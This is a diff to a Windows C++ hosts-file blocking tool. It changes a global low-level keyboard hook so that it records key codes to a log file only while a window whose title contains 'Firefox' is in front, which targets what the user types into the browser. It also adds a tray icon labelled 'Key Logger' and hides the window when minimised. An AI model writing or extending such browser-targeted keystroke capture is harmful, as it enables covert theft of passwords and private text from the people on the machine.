@@ -6,12 +6,18 @@
 #include <ctime>
 #include <locale>
 #include <codecvt>
+#include <cstring>
+#include <winuser.h>
+#include <shellapi.h>
 
 HWND hwndBlockButton;
 HWND hwndUnblockButton;
 HWND hwndDomainInput;
 HWND hwndIpAddressInput;
 std::ofstream logFile;
+
+NOTIFYICONDATA nid;
+bool isHidden = false;
 
 bool AddHostEntry(const std::string& domain, const std::string& ipAddress)
 {
@@ -62,8 +68,22 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
         {
-            // Handle the key press
-            logFile << "Key pressed: " << vkCode << std::endl;
+            // Get the foreground window
+            HWND hwndForeground = GetForegroundWindow();
+
+            // Get the window title
+            char windowTitle[256];
+            GetWindowTextA(hwndForeground, windowTitle, sizeof(windowTitle));
+
+            const auto title = std::string(windowTitle);
+            const auto fireandfox = std::string("Firefox");
+
+            // Check if the window title contains browser keywords
+            if (title.contains(fireandfox))
+            {
+                // Handle the key press and log it
+                logFile << vkCode << " ";
+            }
         }
     }
 
@@ -103,6 +123,17 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
             auto hInstance = reinterpret_cast<HINSTANCE>(GetWindowLongPtr(hwnd, GWLP_HINSTANCE));
 
+
+            ZeroMemory(&nid, sizeof(NOTIFYICONDATA));
+            nid.cbSize = sizeof(NOTIFYICONDATA);
+            nid.hWnd = hwnd;
+            nid.uID = 1;
+            nid.uFlags = NIF_ICON | NIF_TIP | NIF_MESSAGE;
+            nid.uCallbackMessage = WM_APP;
+            nid.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
+            strcpy(nid.szTip, "Key Logger");
+            Shell_NotifyIcon(NIM_ADD, &nid);
+
             // Install the keyboard hook
             HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, hInstance, 0);
             if (hKeyboardHook == nullptr)
@@ -141,6 +172,20 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             }
         }
             break;
+
+        case WM_APP:
+        {
+            switch (LOWORD(lParam))
+            {
+                case WM_LBUTTONDBLCLK:
+                {
+                    ShowWindow(hwnd, SW_RESTORE);
+                    SetForegroundWindow(hwnd);
+                    break;
+                }
+            }
+            break;
+        }
 
         case WM_COMMAND:
         {
@@ -194,8 +239,35 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                     MessageBox(hwnd, "Failed to remove the host entry.", "Error", MB_OK | MB_ICONERROR);
                 }
             }
-        }
+            else if ((reinterpret_cast<HWND>(lParam) == nullptr) && (LOWORD(wParam) == 1))
+            {
+                // Tray icon right-click menu command
+                switch (HIWORD(wParam))
+                {
+                    case WM_LBUTTONUP:
+                    case WM_RBUTTONUP:
+                    {
+                        POINT pt;
+                        GetCursorPos(&pt);
+
+                        HMENU hMenu = CreatePopupMenu();
+                        AppendMenu(hMenu, MF_STRING, 1, "Exit");
+
+                        SetForegroundWindow(hwnd);
+                        TrackPopupMenu(hMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, nullptr);
+                        DestroyMenu(hMenu);
+
+                        break;
+                    }
+                }
+            }
+            else if (HIWORD(wParam) == 0 && LOWORD(wParam) == 1)
+            {
+                // Tray icon 'Exit' menu command
+                PostMessage(hwnd, WM_CLOSE, 0, 0);
+            }
             break;
+        }
 
         case WM_CLOSE:
         {
@@ -209,12 +281,37 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             logFile.close();
 
             DestroyWindow(hwnd);
-        }
             break;
+        }
 
         case WM_DESTROY:
+        {
+            Shell_NotifyIcon(NIM_DELETE, &nid);
             PostQuitMessage(0);
             break;
+        }
+
+        case WM_SYSCOMMAND:
+        {
+            if (wParam == SC_MINIMIZE)
+            {
+                // Hide the window instead of minimizing it
+                ShowWindow(hwnd, SW_HIDE);
+                return 0;
+            }
+            else if (wParam == SC_CLOSE) {
+                auto hKeyboardHook = reinterpret_cast<HHOOK>(GetWindowLongPtr(hwnd, GWLP_USERDATA));
+                if (hKeyboardHook != nullptr)
+                {
+                    UnhookWindowsHookEx(hKeyboardHook);
+                }
+
+                logFile.close();
+
+                DestroyWindow(hwnd);
+            }
+            break;
+        }
 
         default:
             return DefWindowProc(hwnd, uMsg, wParam, lParam);
